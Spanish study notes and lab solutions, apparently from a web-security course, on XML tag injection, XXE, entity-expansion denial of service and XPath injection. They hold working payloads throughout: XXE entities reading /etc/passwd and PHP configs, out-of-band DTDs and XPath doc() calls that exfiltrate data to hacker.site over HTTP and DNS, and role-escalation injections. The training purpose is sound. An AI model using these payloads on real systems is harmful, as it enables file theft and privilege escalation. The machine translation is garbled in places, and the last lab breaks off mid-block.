# XML Attacks

* XML Tag Injection
* XML eXternal Entity
* XML Entity Expansion
* Xpath Injection

## Introduction

Hay muchos campos de uso que aprovechan XML:

```
- PDF
- RSS
- OOXML
- SVG
- network protocols such XMLRPC, SOAP, WebDAV and many others
```

### Recap

Técnicamente, XML se deriva del estándar SGML y es el mismo estándar en el que se basa HTML, sin embargo, con una implementación ligera. Esto significa que algunas características basadas en SGML, como etiquetas cerradas sin cerrar, etc. No se aplican

* Las normas html5 no están basadas en SGML
* Definición de tipo de documento (DTD):

Bloque de XML:

```
- Elements
- Tags
- Attributes
- Entities
- PCDATA (Parsed Character Data)
- CDATA
```

Bloque de entidades:

→ http://www.w3.org/TR/REC-xml/#sec-logical-struct

* Para permitir la flexibilidad, las especificaciones han introducido estructuras físicas

→ http://www.w3.org/TR/REC-xml/#sec-physical-struct

![[Pasted image 20240311153508.png]]

Hay varios tipos de entidades, dependiendo de dónde se declaren, cuán reutilizables sean, y si es necesario analizarlas. Pueden clasificarse, como sigue:

```
- Internal/External
- General/Parameter
- Parsed/Unparsed
```

Sólo 5 combinaciones de categorías de entidades se consideran legales

```
# Internal
General   + Parsed
Parameter + Parsed

# External
General   + Parsed
General   + Unparsed
Parameter + Parsed
```

### Generally speaking, there are three options

```
- XML is tampered
- XML document containing an attack is sent
- XML is taken using a querying mechanism
```

## Tag/Fragment Injection

En este escenario, el atacante es capaz de alterar la estructura de documentos XML inyectando tanto datos XML como etiquetas XML.

* Supongamos que una aplicación web está utilizando XML para almacenar usuarios y contraseñas

Si el usuario es capaz de inyectar algunos metacaractos **XML** dentro del documento. La, si la aplicación no valida contextualmente los datos, es vulnerable a XML Injection:

```
Metacharacters: ' " < > &    '
```

Cómo probar:

```
- We have to inject metacharacters, attempting to break some of the structures
```

## Texting XML Injection

### Single/Double Quotes

Se utilizan comillas únicas y dobles para definir un valor de atributo en la etiqueta:

```xml
<group id="id">admin</group>  <group id='id'>admin</group>
```

Un _ID_ como el siguiente, hará que el XML sea incorrecto:

```xml
<group id="12"">admin</group>  <group id='12''>admin</group>      "
# duplicating the Quotes
```

### Ampersand &

Se utiliza para representar a las entidades:

```xml
&EntityName;
```

* Al inyectar **\&name;**, podemos desencadenar un error si la entidad no está definida. Adicionalmente, podemos intentar eliminar el último **;**, generando una estructura XML malformada.

### Angular Parentheses

```
< >
```

Usando paréntesis angulares, podemos comenzar a definir varias áreas dentro del documento XML, tales como nombres de etiquetas, comentarios y secciones CDATA:

```xml
<tagname> <!-- --> <![CDATA[value]]>
```

### XSS with CDATA

También podemos tratar de explotar el analizador XML, introduciendo así un posible vector de ataque XSS y posiblemente eludiendo un filtro débil.

```xml
<script><![CDATA[alert]]>('XSS')</script>
```

Durante el procesamiento XML, se elimina la sección CDATA, generando la infame carga útil XSS

```xml
<script>alert('XSS')</script>
```

Es posible escapar de los paréntesis angulares:

```xml
<![CDATA[<]]>script<![CDATA[>]]>alert('XSS')<![CDATA[<]]>/script<![CDATA[>]]>
```

Igualdos:

```xml
<script>alert('XSS')</script>
```

## XML External Entity

Consistencia de la inyección de entidades externas en la definición del documento; Este tipo de ataque se conoce como **XXE** (Sentidades eXX/XML)

* En general, la idea es decirle a los parsers XML que carguen entidades definidas externamente, lo que permite acceder a contenidos sensibles almacenados en el host vulnerable.

### Taxonomy

Dos tipos:

```
- Private 
- Public
```

* Private entidades externas
* Se limitan a un solo autor o grupo de autores

Público:

Fue diseñado para un uso más amplio:

```xml
<!ENTITY name SYSTEM "URI"> //private
<!ENTITY name PUBLIC "PublicID" "URI"> //public
```

* Importante tener en cuenta que el campo URI no limita los ábanos XML de resolver protocolos HTTPs solamente
* Hay una serie de esquemas válidos **URI** permitidos (FILE, FTP, DNS, PHP, etc.)

→ http://en.wikipedia.org/wiki/URI\_scheme

Con entidades externas, podemos crear \*\* referencias dinámicas\*\* en el documento

* Los más peligrosos son los privados, porque nos permiten revelar archivos del sistema local, jugar con esquemas de red, manipular aplicaciones internas, etc.

### Resource Inclusion

El atacante suba/elabora un archivo XML malicioso

Esto incluye una definición de entidad externa que apunta a un archivo local:

```xml
<!ENTITY xxefile SYSTEM "file:///etc/passwd">
```

Luego, en el cuerpo de la solicitud XML, añaden la referencia a la entidad creada:

```xml
<body>&xxefile;</body>
```

![[Pasted image 20240311153600.png]]


![[Pasted image 20240311153615.png]]

![[Pasted image 20240311153625.png]]

* Una vez que el receptor lea el mensaje, no sólo verá el cuerpo del mensaje, sino también el contenido de la entidad externa \&xxefile;(/etc/passwd file)

### Resource Inclusion - Improved

```
& < > are special characters and will cause errors
```

* vamos a ver más ejemplos

Queremos acceder a un archivo de configuración de php:

```php
<?php
&config=array();
&config['username'] = 'hiddenuser';
&config['password'] = 'mysuperpassword';
```

```
In case we try to use the classic technique to extract the resource via XXE, 
it will fail because is has special characters such as > and &
```

* even with **\[CDATA] bypass** it will fail

Entidades de parámetros

→ https://www.w3.org/TR/xml/#dt-PE

```xml
<!ENTITY % name "value">
<!ENTITY % name SYSTEM "URI">
<!ENTITY % name PUBLIC "PublicID" "URI">
```

### CDATA Escape Using Parameter Entities

Tanto utilizando la circunslogación CDATA como las Entidades de Parámetro posible para recuperar el contenido de los recursos

![[Pasted image 20240311153638.png]]

It works in major XML parsers

Pero en PHP hay una alternativa: Built-in Wrapper

→ http://php.net/manual/en/wrappers.php.php

### php://I/O streams

→ php://filter

Este es un tipo de meta-enviador diseñado para convertir los filtros de la aplicación a un flujo en el momento de la apertura

→ http://php.net/manual/en/filters.php

> Para evitar errores de análisis XML, necesitamos un filtro que lea el archivo de destino y luego convierta el contenido en un formato que sea inofenable a la estructura XML

![[Pasted image 20240311153648.png]]

Base64:

```
php://filter/read=conver.base64-encode/resource=/path/to/config.php
```

### Bypassing Access Controls

Deja mejorar el archivo de configuración PHP anterior añadiendo una restricción de acceso a las direcciones IP de un servidor local

![[Pasted image 20240311153704.png]]

Si intentamos acceder a ella desde la web, se mostrará una página **ACCESS DENIED**

* Sin embargo, si el frontend es vulnerable a XXE, podemos explotar el defecto y robar el contenido de la página.

### Out-of-Band Data Retrieval

Esta técnica OOB podemos utilizar cuando no podemos extraer contenido de archivo sin ninguna salida directa.

![[Pasted image 20240311153716.png]]

![[Pasted image 20240311153728.png]]

Para ayudar en la explotación de esta técnica:

```
https://github.com/joernchen/xxeserve
```

Es una aplicación que ejecuta un servidor que es útil para recopilar datos enviados fuera de banda

* Ejemplo con XXEServe en imágenes

### Note from Video

#### 1

```xml
<!DOCTYPE test [
<!ENTITY fakeEntity SYSTEM "file:///etc/passwd">
]>
...
&fakeEntity
```

#### 2

```xml
<!DOCTYPE test [
<!ENTITY fakeEntity SYSTEM "http://hacker.site:1337/XXE_OOB_TEST">
]>

...
&fakeEntity
```

in kali:

```bash
netcat -lvnp 1337 -k -w 1
```

Coge el xxeserver de github

Añáda estas líneas:

```bash
set :bind, "xxe.hacker.site"
set :port, 80
```

### evil DTD

```xml
<!ENTITY % resource SYSTEM "php://filter/read=conver.base64-encode/resource=file:///etc/fstab">
<!ENTITY % LoadOOBEnt "<!ENTITY &#x25; OOB SYSTEM 'http://xxe.hacker.site/?p=%resource;'> ">
```

### evil XML

```xml
<!DOCTYPE XXE_OOB [
  <!ENTITY % EvilDTD SYSTEM "http://hacker.site/evil.dtd">
  %EvilDTD; 
  %LoadOOBEnt; // the entity that defines a new entity
  %OOB; // entity that performs the OOB communication
]>
```

> no olvide abrir el xxeserver El espacio debe ser cambiado a signo antes de que se pueda decodificar la base64

```bash
cat <file> | tr ' ' '+' | base64 -d
```

## XML Entity Expansion (XEE)

Es un **Denial of Service** Attack

### Recursive Entity Expansion

El ataque XEE más conocido: **Billion Laughs**

* El ataque explota a los parsers XML en conjuntos de pequeñas entidades que resuelven exponencialmente.

Esto se hace con el fin de explotar los datos de una cadena simple **lol** a un billete de miles de millones **lol** cadenas

### Billion Laughs Attack

![](<../../.gitbook/assets/image (47).png>)

Este ataque puede crecer a aproximadamente 3GB de memoria

* Es una gran cantidad de utilización de la memoria y obviamente bastante devastador

### Generic Entity Expansion

Otro ataque DoS es el ataque de la blowup \*\*

![[Pasted image 20240311153749.png]]

> Podemos ofuscar este ataque malicioso moviendo la definición de las entidades de la DTD local a una externa.

Obfuscante:

![[Pasted image 20240311153802.png]]

## XPath Injection

Debe conocerse antes de jugar con otros idiomas paralelos, tales como:

```
- XQuery
- XSLT
- Xlink
- XPointer
```

XPath se considera como el SQL Para consultar bases de datos XML

### XPath Recap

XPath nos permite navegar alrededor de la estructura del árbol XML para que podamos recuperar una lista de nodos, un valor atómico o cualquier secuencia permitida por el modelo de datos que respete los criterios de búsqueda.

### New Operations and Expressions on Sequences

The most signigicant keyword: **SEQUENCE**

→ http://www.w3.org/TR/xpath-functions/

Sequence es una colección ordenada de cero o más artículos. Un artículo es un nodo o un valor atómico. Un nodo es un ejemplo de uno de los tipos de nodos definidos en el Modelo de Datos.

* Cada expresión de XPath devuelve una secuencia. Se trata de una agrupación ordenada de valores atómicos o nodos con duplicados permitidos.

### Function on Strings

**upper-case** and **lower-case** son útiles durante la fase de detección, especialmente si no conocemos la versión XPath utilizada.

* Si somos capaces de producir una salida positiva, entonces la función existe, por lo tanto, por lo que la convierte en la versión 2.0

Si se produce una salida negativa, entonces su versión 1.0

```
/Employees/Employee[username="$_GET['c']"]
```

**base-uri** es útil para detectar propiedades sobre URIs. Llamar a esta función sin pasar ningún argumento nos permite potencialmente obtener la ruta completa de URI del archivo actual:

```
base-uri()
# file://path/to/XMLfile.xml
```

### FOR Operator

Permite la iteración (boca) sobre las secuencias, devolviendo así un nuevo valor Para cada repetición. La siguiente expresión de XPath recupera la lista de nombres de usuario:

```bash
for $x in /Employees/Employee return $x/username
```

### Conditional Expression

* **if**

```bash
if ($employee/role = 2)
  then $employee
  else 0
```

### Regular Expression

Otra mejora útil implica la capacidad de usar sintaxis de expresión regular Para emparejarlos usando las palabras clave **matches**, **replace**, o **tokenize**.

* Estas funciones utilizadas en conjunto con operadores condicionales y otros cuantificadores son grandes conjuntos de herramientas Para los atacantes.

### Assemble/Disassemble Strings

**codepoints-to-string** and **string-to-codepoints**.

> Nos permiten convertir una cadena en una secuencia de entero y respectivamente, a partir de una secuencia de entero devuelve una cadena:

![[Pasted image 20240311153942.png]]

### Data Types

La primera versión de XPath soporta cuatro tipos de datos:

```
- Number (floating-point)
- String
- Boolean
- Node-Set
```

v2.0 soporte introducido Para todos los tipos de primite simples incorporados en el esquema XML además de 19 tipos simples, tales como **dates**, **URIs**, etc

![[Pasted image 20240311153954.png]]

Recurso para Xpath:

```
https://www.w3schools.com/xml/xpath_syntax.asp
```

## Advanced XPath Exploitation

### Blind Exploitation

#### Error Based:

* Al igual que explotar la inyección SQL, la técnica de extracción a base de errores \*\* es adecuada si, con una consulta XPath, podemos generar un error de tiempo de ejecución y este error es detectable de alguna manera.
* Queremos configurar nuestras pruebas para desencadenar un error cada vez que se cumpla una condición específica.

**error()** plantea un error y nunca devuelve un valor que es exactamente lo que necesitamos For O nuestras pruebas

Por ejemplo:

```bash
... and (if ( $employee/role = 2) then error() else 0 ) ...
```

> El error se puede mostrar en un **div**, como una página de 500, un código de estado HTTP personalizado, y / o muchos otros métodos

#### Boolean Based:

Al aprovechar varias técnicas de inferencia, tenemos que extraer información basada en un conjunto de deducciones enfocadas

* Los más utilizados son: \*\* técnicas basadas en booleanos\*\* y **time-based**, sin embargo en XPath no hay características que nos permitan manejar retrasos, por lo tanto sólo podemos utilizar los ataques booleanos.
* Por ejemplo: Las funciones de cuerda que usan Pattern Matching son útiles para reducir el espacio de búsqueda de personajes

→ http://www.w3.org/TR/xpath-functions/#string.match

Mientras que las funciones en valores de cadena, tales como **normalizar-unicode**, etc. Son útiles en el manejo de toda la codificación posible (imposible sin estas funciones).

→ http://www.w3.org/TR/xpath-functions/#string-value-functions

### OOB Exploitation

in Xpath 2.0 = http://www.w3.org/TR/xpath-functions/#func-doc

**doc($uri)**

* Si somos capaces de incluir un archivo, remota o localmente, en nuestra aplicación de destino, entonces podemos hacer un montón de cosas malas y, por supuesto, en este caso, podemos.

Con la función **doc**, podemos leer cualquier archivo XML local:

```bash
(substring((doc('file://protected/secret.xml')/*[1]/*[1]/text()[1]),3,1))) < 127
```

## HTTP Channel

Podemos engañar al sitio de la víctima para que envíe lo que no podemos leer a nuestro servidor web controlado.

Ejemplo con el doc ():

```js
doc(concat("http://hacker.site/oob/", RESULTS_WE_WANT))
doc(concat("http://hacker.site/oob/", /Employees/Employee[1]/username))
```

El URI tiene sus reglas y necesitamoscodificar las cuerdas para hacer el formato adecuado para enviar desde el sitio de la víctima al sitio de ataque.

**encode-for-uri** function:

```js
doc(concat("http://hacker.site/oob/", encode-for-uri(/Employees/Employee[1]/username)))
```

Configurar un servidor HTTP de escucha es bastante simple; sin embargo, si somos perezosos, entonces podemos usar 'xxeserve' o 'xcat'

→ xxeserve = https://github.com/joernchen/xxeserve

→ xcat = http://xcat.readthedocs.org/

XCat es una herramienta de línea de comandos que ayuda en la explotación de fallas de inyección de XPath Ciego. Algunas características:

```
- Advanced data postback through HTTP
- Arbitrarily read XML/text files on the web server via the **doc() function** and crafted SYSTEM entities (XXE)
```

### DNS Channel

A menudo el canal HTTP está bloqueado por cortafut o filtros

* Usualmente incluso cuando no podemos exfiltrar a través de HTTP, las consultas DNS salientes se permiten el acceso a huéspedes arbitrarios.
* Por lo tanto, en lugar de enviar datos como parámetros GET, utilizamos un servidor de nombre controlado y obligamos al sitio de la víctima a resolver nuestro dominio con ellos jugosos datos como valores de subdominio, como:

→ http://username.password.hacker.site

* La longitud de cualquier etiqueta está limitada a entre 1 y 63 octets y globalmente, un nombre de dominio completo, se limita a 255 octets (incluidos los separadores)

> Dado que DNS utiliza principalmente UDP, no está garantizado que las solicitudes lleguen al servidor de atacantes. Piensa en la congestión de la red o todas las demás posibilidades que podrían hacer que los datos se pierdan.

## Note from Video

```js
... and count(/*[1]/*)=1
# find the tree of the XML file

... and substring(name(/*[1],1,1)='a'
# guess the names

in 2.0 we can use:
... and string-to-codepoints(/*[1],1,1) > 100

# in this case codepoints.net can help us translate the values to strings
```

### to exfiltrate via HTTP

Configurar un servidor web en apache2

```js
... and doc('http://hacker.site/OOB/test/request')

... and doc(concat('http://hacker.site', 'value1/', 'value2'))

... and doc(concat('http://hacker.site', name(/*)))
# to discover the root name xml file

... and doc(concat('http://hacker.site', name(/*[1]/*[1])))
# u can discover the full tree name

... and doc-available(concat('http://hacker.site', encode-for-uri(name(/*[1]/*[1]))))

```

### to exfiltrate via DNS

```bash
apt-get install maradns
```

Básicamente vamos a configurar un DNS en funcionamiento como \*.hacker.site

* todos los subdominios redirán su redirija a hackersite.

Entonces podemos exfiltrar los valores de los archivos XML en los espacios subdomain:

```js
and doc-available(concat('http://', name(/*),'.', '.__.hacker.site')
```

> Olvídate de la **tail -f** en el archivo de registro maradns para obtener los resultados

* if Tenemos que probar el espacio u otros personajes que no están permitidos

necesitamos obtener el valor en codepoints.net y encode como

```bash
curl hello\32world.hacker.site
```

### Using automated Tool

Xcat:

```python
python run_xcat.py --method GET http://xpath.hacker.site title=Code title "Brown" test_injection
python run_xcat.py --method GET http://xpath.hacker.site title=Code title "Brown" run
python run_xcat.py --method GET http://xpath.hacker.site title=Code title "Brown" run retrieve //this will retrieve the whole file
python run_xcat.py --public-ip "127.3.4.5" --method GET http://xpath.hacker.site title=Code title "Brown" run retrieve
python run_xcat.py --method GET http://xpath.hacker.site title=Code title "Brown" run file_shell
```

## Lab 1

### Solutions - Lab #1

Simple XML TAG de explotación de inyección de aplicación: _D0 u wánn b3 a l33t m3mb3r?_

Antecedentes

Hay dos tipos de usuarios: leet y más suelto. Por defecto, cada nuevo usuario es un más suelto. Encuentra una manera de convertirte en miembro de la lega. Pasos de explotación

Una estructura XML válida se reporta en el archivo core.js dentro de la función .WSregister.old.

Como se puede ver en la implementación anterior, los desarrolladores utilizaron un enfoque diferente que nos ayuda a detectar la estructura XML en este escenario.

```xml
function WSregister__old() {
...
  var xml = '<?xml version="1.0" encoding="utf-8"?> ';
  xml += '<user>                                    ';
  xml += '    <role>2</role>                        ';
  xml += '    <name>' + name + '</name>             ';
  xml += '    <username>' + username + '</username> ';
  xml += '    <password>' + password + '</password> ';
  xml += '</user>                                   ';
...
}
```

Nombre del parámetro de prueba Registro:

* Si registramos a un usuario, podemos ver que su nombre se refleja en el mensaje de bienvenida y está codificado con htmlspecialchars.
* Además, si tratamos de inyectar algunas etiquetas (por ejemplo, ), la aplicación funciona y registra al nuevo usuario. Por lo tanto, este parámetro no es inyectable.

Contraseña de parámetro de prueba:

* Si adoptamos el mismo enfoque con la contraseña, podemos ver que incluso la contraseña no es inyectable.

Nombre de usuario del parámetro de prueba:

* El único parámetro inyectable es el nombre de usuario.

Si aprovechamos la estructura XML que se encuentra en el archivo core.js podríamos inyectar fácilmente a nuestro usuario de leet de la siguiente manera:

```xml
name:     useless
username: useless</username></user><user><rule>1</rule><name>l33t</name><username>l33t
password: l33t

The leet login will be:

username: l33t
password: l33t
```

### Solutions - Lab #2

Explotación inyectable XML simple con limitación de longitud: _Does Longitud Matter?_

Antecedentes

Hay dos tipos de usuarios: leet y más suelto. Por defecto, cada nuevo usuario es un más suelto. Encuentra una manera de convertirte en miembro de la lega. Pasos de explotación

Una estructura XML válida se reporta en el archivo core.js dentro de la función WSregister.old.

Como se puede ver en la implementación anterior, los desarrolladores utilizaron un enfoque diferente que en este escenario, que nos ayuda a detectar la estructura XML:

```xml
function WSregister__old() { 
  ...
  var xml = '<?xml version="1.0" encoding="utf-8"?> ';
  xml += '<user>                                    '; 
  xml += '    <role>2</role>                        '; 
  xml += '    <name>' + name + '</name>             '; 
  xml += '    <username>' + username + '</username> '; 
  xml += '    <password>' + password + '</password> '; 
  xml += '</user>                                   '; 
  ... 
}
```

Nombre del parámetro de prueba:

* Registrar un usuario de prueba, podemos ver que el nombre del nuevo usuario se refleja de nuevo en el mensaje de bienvenida y está codificado con htmlspecialchars.

Si tratamos de inyectar algunas etiquetas (por ejemplo ), la aplicación devuelve un mensaje de error:

* Apertura y final de la etiqueta desajuste ...

Nombre de usuario del parámetro de prueba:

* Si adoptamos el mismo enfoque que antes, podemos ver que incluso el nombre de usuario es inyectable.

Contraseña de parámetro de prueba:

* Si adoptamos el mismo enfoque que antes, podemos ver que la contraseña no es inyectable.

Limitaciones de longitud:

* Nos damos cuenta de que el nombre y el nombre de usuario tienen limitaciones de longitud de 35 caracteres.

> De hecho, si tratamos de inyectar algo más, la aplicación corta/trunca nuestra entrada.

Como tenemos dos puntos de inyección, para eludir esta limitación podemos dividir e inyectar nuestra carga útil en los dos lugares:

```xml
name:     </name></user><user><rule>1<!--
username: -- ></rule><name>x</name><username>x
password: l33t

The leet login will be:

username: x
password: l33t
```

### Solutions - Lab #3

Explotación de inyección XML TAG con limitación de longitud y filtros: _Si estás cansado .. tienes un descanso_

Antecedentes

Hay dos tipos de usuarios: leet y más suelto. Por defecto, cada nuevo usuario es un más suelto. Encuentra una manera de convertirte en miembro de la lega. Pasos de explotación

Una estructura XML válida se reporta en el archivo core.js dentro de la función WSregister.old.

Como se puede ver en la implementación anterior, los desarrolladores utilizaron un enfoque diferente que en este escenario, que nos ayuda a detectar la estructura XML.

```xml
function WSregister__old() {
  ...
  var xml = '<?xml version="1.0" encoding="utf-8"?> '; 
  xml += '<user>                                    '; 
  xml += '    <role>2</role>                        '; 
  xml += '    <name>' + name + '</name>             '; 
  xml += '    <username>' + username + '</username> '; 
  xml += '    <password>' + password + '</password> '; 
  xml += '</user>                                   '; 
  ...
}
```

Nombre del parámetro de prueba:

* Registrar un usuario de prueba, podemos ver que el nombre del nuevo usuario se refleja de nuevo en el mensaje de bienvenida y está codificado con htmlspecialchars. Pero, si tratamos de inyectar algunas etiquetas (por ejemplo, , ,),

La aplicación devuelve un mensaje de error como el siguiente:

* Apertura y final de la etiqueta desajuste ...

Nombre del parámetro de prueba:

* Si adoptamos el mismo enfoque que antes, podemos ver que incluso el nombre de usuario es inyectable.

Contraseña de parámetro de prueba:

* Si adoptamos el mismo enfoque que antes, podemos ver que la contraseña no es inyectable.

Limitaciones de longitud:

* Notamos que el nombre y el nombre de usuario tienen limitaciones de longitud de 34 caracteres.

> De hecho, si tratamos de inyectar algo más, la aplicación corta/trunca nuestra entrada.

Como tenemos dos puntos de inyección, para eludir esta limitación podemos dividir e inyectar nuestra carga útil en los dos lugares:

```xml
name:     </name></user><user><rule>1<!--
username: --></rule><name></name><username>x
password: l33t
```

Bypassing Filters:

* Eludiendo las limitaciones de longitud no es suficiente. La aplicación implementa algunos filtros contra la inyección XML TAG que bloquea la carga útil anterior.

En este caso, si el filtro detecta algunos elementos peligrosos, muestra un mensaje como el siguiente:

```xml
So you wanna be a l33t member so easily?! ಠ_ಠ

# Injecting some metacharacters, we can see that &, \ , , , "" , '' are filtered but < and > are not!
```

Hay otro filtro que bloquea la y las etiquetas.

La comprobación es insensible a caso, y parece que los espacios y las pestañas se ignoran entre el nombre de la etiqueta y el carácter de la etiqueta cercana, pero si inyectamos una nueva línea, no se filtra.

Así que la explotación podría ser la siguiente:

```xml
name:     </name></user><user><rule{NEW_LINE}>1<!--
username: --></rule{NEW_LINE}><name></name><username>x
password: l33t
```

Ahora el nombre de usuario tiene una longitud de 35; inyectando esta carga útil, tendríamos un nombre de usuario vacío y por lo tanto un login inválido.

* Tenemos que eliminar algo de la carga útil, y la etiqueta parece ser ignorada del lado del servidor.

La explotación laboral es:

```xml
name:     </name></user><user><rule{NEW_LINE}>1<!--
username: --></rule{NEW_LINE}><username>l33t
password: l33t
```

Adentro de la eruche la solicitud debe verse como sigue:

```xml
POST /add_new.php HTTP/1.1
...
name=</name></user><user><rule
>1<!--&user=--></rule
><username>l33t&password=l33t

The leet login will be:

username: l33t
password: l33t 
```

## Lab 2

A continuación, puedes encontrar soluciones para cada tarea. Recuerde, sin embargo, que usted puede seguir su propia estrategia, que puede ser diferente de la que se explica en el siguiente laboratorio.

> NOTA: Las técnicas a utilizar durante este laboratorio se explican mejor en el material del estudio. Usted debe referirse a él para más detalles. Estas soluciones se proporcionan aquí sólo para verificar la corrección.

### Solutions - Lab #1

Explotación básica XXE: requiere un archivo para la solución:

_Simplemente calentamiento_ Etapas de explotación:

```bash
Download the content of .letmepass (exploit.sh can be found at http://1.xxe.labs/solution/exploit.sh)

./exploit.sh {DOCROOT}/.letmepass
```

Extraer el contenido del resultado:

```bash
[Step 1] | awk 'match($0, /<b>XXEME (.*)<\\\/b>/, m) { print m[1] }'

OR

[Step 1] | gawk 'match($0, /<b>XXEME (.*)<\\\/b>/, m) { print m[1] }'
```

Eliminar JSON escapar de los personajes:

```bash
[Steps 1|2] | sed 's/\\\//\//g'
```

Comando de prueba:

Nota: este es el comando awk basado en GNU:

```bash
./exploit.sh /var/www/1/.letmepass \
| awk 'match($0, /<b>XXEME (.*)<\\\/b>/, m) { print m[1] }' \
| sed 's/\\\//\//g'
```

### Solutions - Lab #2

Explotación básica XXE y rizo básico con solución codificada base64:

_Simple (codificado) calentamiento_

Fasea válida

El nombre de usuario oculto es el Ohpe que base64-codificado es: **dGhlT2hwZQ ==**.

Para recuperar el valor, se requiere realizar una solicitud DELETE al script whois.php. Subs de explotación

Descargar el contenido de .letmepass:

```bash
./exploit.sh {DOCROOT}/.letmepass
```

Extraer el contenido del resultado:

```bash
[Step 1] | gawk 'match($0, /<b>XXEME (.*)<\\\/b>/, m) { print m[1] }'
```

Eliminar JSON escapar de los characters:

```bash
[Steps 1|2] | sed 's/\\\//\//g'
```

Recupera el contenido de whois.php usando el verbo DELETE:

```bash
curl -s "http://2.xxe.labs/whois.php" -X DELETE
```

* Base64 decodifica y almacena el resultado en un archivo.

> El comando base64 tiene diferentes implementaciones; por lo tanto, es posible que necesite uno de estos dos interruptores para decodificar:

```bash
[Steps 1|2|3] | base64 -d

OR

[Steps 1|2|3] | base64 -D
```

Testing command:

```bash
./exploit.sh php://filter/convert.base64-encode/resource=/var/www/xxe/2/.letmepass \
| awk 'match($0, /<b>XXEME (.*)<\\\/b>/, m) { print m[1] }' \
| sed 's/\\\//\//g'

curl -s 'http://2.xxe.labs/whois.php' -X DELETE | base64 -d
```

### Solutions - Lab #3

_La solución está codificado y se desconfase en un archivo php_

No rompas mi XML:

Subs de explotación

Descargar base64 codificado el contenido de .letmepass:

```bash
./exploit.sh php://filter/convert.base64-encode/resource=/var/www/3/.letmepass.php
```

Extraer el contenido del resultado:

```bash
[Step 1] | gawk 'match($0, /<b>XXEME (.*)<\\\/b>/, m) { print m[1] }'
```

Eliminar JSON escapar de los personajes:

```bash
[Steps 1|2] | sed 's/\\\//\//g'
```

Base64 decodificar y almacenar resulta en un archivo:

```bash
[Steps 1|2|3] | base64 -d > whaat.php

OR

[Steps 1|2|3] | base64 -D > whaat.php
```

De-obfuscar la variable $config y ejecutar el script php:

```bash
echo 'var_dump($config);' >> whaat.php | php whaat.php
```

Testing command:

```bash
./exploit.sh php://filter/convert.base64-encode/resource=/var/www /3/.letmepass \
| awk 'match($0, /<b>XXEME (.*)<\\\/b>/, m) { print m[1] }' \
| sed 's/\\\//\//g' \
| base64 -d > whaat.php

echo 'var_dump($config);' >> whaat.php | php whaat.php
```

### Solutions - Lab #4

Un archivo png contiene la solución:

\*Te gusta ASCII? Lo hago. Subs de explotación

Descargar la base64 codificado el contenido de .letmepass:

```bash
./exploit.sh php://filter/convert.base64-encode/resource=/var/www/4/.letmepass.php
```

Extraer el contenido del resultado:

```bash
[Step 1] | gawk 'match($0, /<b>XXEME (.*)<\\\/b>/, m) { print m[1] }'
```

Eliminar los charater de fuga de JSON:

```bash
[Steps 1|2] | sed 's/\\\//\//g'
```

Base64 decodificar y almacenar resulta en un archivo:

```bash
[Steps 1|2|3] | base64 -d > wohoo.png

OR

[Steps 1|2|3] | base64 -D > wohoo.png
```

* Abra el archivo.

Testing command:

```bash
./exploit.sh php://filter/convert.base64-encode/resource=/var/www/4/.letmepass \
| awk 'match($0, /<b>XXEME (.*)<\\\/b>/, m) { print m[1] }' \
| sed 's/\\\//\//g' \
| base64 -d > wohoo.png

open wohoo.png
```

### Solutions - Lab #5

En una carpeta llena de archivos, hay una especial...:

_Wheres el archivo oculto?_

Pasos de explotación

La solución dentro de basexml.php.

```bash
Part 1

- Download the base64 encoded the content of .letmepass.
- Extract the content from the result.
- Remove the JSON escaping characters.
- Base64 decode and store result within a file.
```

Part 2

```bash
- Download a list of common PHP file names; this is a good resource: Filenames_PHP_Common.wordlist @ (http://blog.thireus.com/web-common-directories-and-filenames-word-lists-collection)
- Automate the retrieving process:
- Similar to Part 1
- Parse result and show the good file that contains the tag .
```

Testing command:

Part 1

Extraer instrucciones de .letmepass:

```bash
./exploit.sh /var/www/5/.letmepass
```

Part 2

```bash
./file_extractor.sh /var/www/5/hidden/
```

### Solutions - Lab #6

Blind XXE aquí. IT requiere algunas explotacións de OOB:

_Salígue de aquí_ Subs de explotación

La solución está dentro de .letmepass.php; esta es una explotación de XXE ciego, por lo que es necesario configurar un canal OOB.

Estos son los pasos:

Ejerce la carga útil XML moviendo las definiciones de entidad externa en otro archivo DTD (evil-oob.dtd)

```xml
<?xml version='1.0'?>
<!DOCTYPE xxe [
    <!ENTITY % EvilDTD SYSTEM 'http://hacker.site/evil_oob.dtd'>
    %EvilDTD;
    %LoadOOBEnt;
    %OOB;
]>
<login>
    <username>XXEME</username>
    <password>password</password>
</login>
```

Crear maloob.dtd de la siguiente manera:

```xml
<!ENTITY % resource SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/6/.letmepass.php">
<!ENTITY % LoadOOBEnt "<!ENTITY &#x25; OOB SYSTEM 'http://hacker.site:2108/?p=%resource;'>">
```

> \[Nota] http://hacker.site:2108/xml?p=%resource es el camino donde la cáscara xxeserve está escuchando; puedes cambiarlo con lo que quieres.

* Ejecutar el guión de xxeserve

ruby xxeserve.rb

Puedes mejorar xxeserve añadiendo las siguientes líneas. De esta manera, puede personalizar el puerto y alojar para usar:

```bash
set :bind, 'hacker.site'
set :port, 2108
```

Base64 Decode

Decode lo que ha recibido la concha. Comae con la carpeta de archivos

```bash
cat files/{IP.TIME} | base64 -d
```

### Solutions - Lab #7

En una carpeta llena de archivos, hay una especial... el defecto es ciego:

\*Salígue de aquí, pero espera... dónde está el archivo oculto?

Pasos de explotación

La solución está en Background.php; esta es una explotación de XXE ciega, por lo que es necesario configurar un canal OOB.

Estos son los pasos:

```
- Retrieve the .letmepass file for instructions
- Automate the retrieving process
```

a. Recuerda el archivo .letmepass para instrucciones

Ejercenizar la carga útil XML moviendo las definiciones de entidad externa en otro archivo DTD (evil-oob.dtd)

Archivo: exploit.sh

```xml
<?xml version='1.0'?> 
<!DOCTYPE xxe [
    <!ENTITY % EvilDTD SYSTEM 'http://hacker.site/evil_oob.dtd'>
    %EvilDTD;
    %LoadOOBEnt;
    %OOB;
]>
<login> 
    <username>XXEME</username> 
    <password>password</password> 
</login>
```

Archivo: evil\_oob.dtd

```xml
<!ENTITY % resource SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/7/.letmepass.php"> 
<!ENTITY % LoadOOBEnt "<!ENTITY &#x25; OOB SYSTEM
'http://hacker.site:2108/?p=%resource;'>">
```

> \[NOTA] http://hacker.site:2108/xml?p=%resource Es el camino donde la cáscara de xxeserve está escuchando; puedes cambiarlo con lo que quieres.

* Ejecuta el guión de xxeserve

```ruby
ruby xxeserve.rb
```

\[NOTA] Añadié las siguientes líneas para personalizar el puerto y el host

```bash
set :bind, 'hacker.site'
set :port, 2108
```

Decode the .letmepass

```
file
```

Decode lo que ha recibido la concha. Comae con la carpeta de archivos

```bash
